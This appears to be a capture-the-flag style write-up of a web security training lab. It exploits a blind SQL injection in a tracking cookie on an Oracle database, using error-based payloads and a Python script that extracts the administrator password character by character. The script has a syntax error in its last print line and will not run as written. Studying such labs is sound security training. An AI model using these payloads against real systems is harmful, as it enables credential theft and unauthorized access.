# Lab: Blind SQL injection with conditional errors
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
>

## Step 1 : Check vul in cookie header 
`Cookie: TrackingId=yp56RjgdYZOCDcLU; session=1eiC0v7TXw3mZrOBBHCwKwwcKHZEI8Yr`

```sql
1' or 1=1-- -
```
## Step 2 : Check length
```sql
123' union select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and length(password)=20-- -
```
=> After checking , we discovered that the database is Oracle
=> Conditional in Oracle => `CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE '' END FROM table_name`
TO_CHAR(1/0) is a divide-by-zero error => 500

## Step 3 : Code bypass
```py
import requests
import string

url='https://acaa1fa41e0d3e4cc05d039200b7009c.web-security-academy.net/'
chars = string.printable[:-6]
#print(chars)
admin_pass=''
i=1
s=requests.Session()
s.get(url)

while True:
	for c in chars:
		payload = f"1' union select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,{i},1)='{c}'-- -"
		cookie1={"TrackingId":payload}
		r = requests.get(url,cookies=cookie1)
		print(c)
		if r.status_code == 500:
			print('okeeeeeeeeeee')
			admin_pass+=c 
			i+=1
			print(admin_pass)
			break
		if(i==21):
			print('password administrator :' admin_pass)
			exit()
```
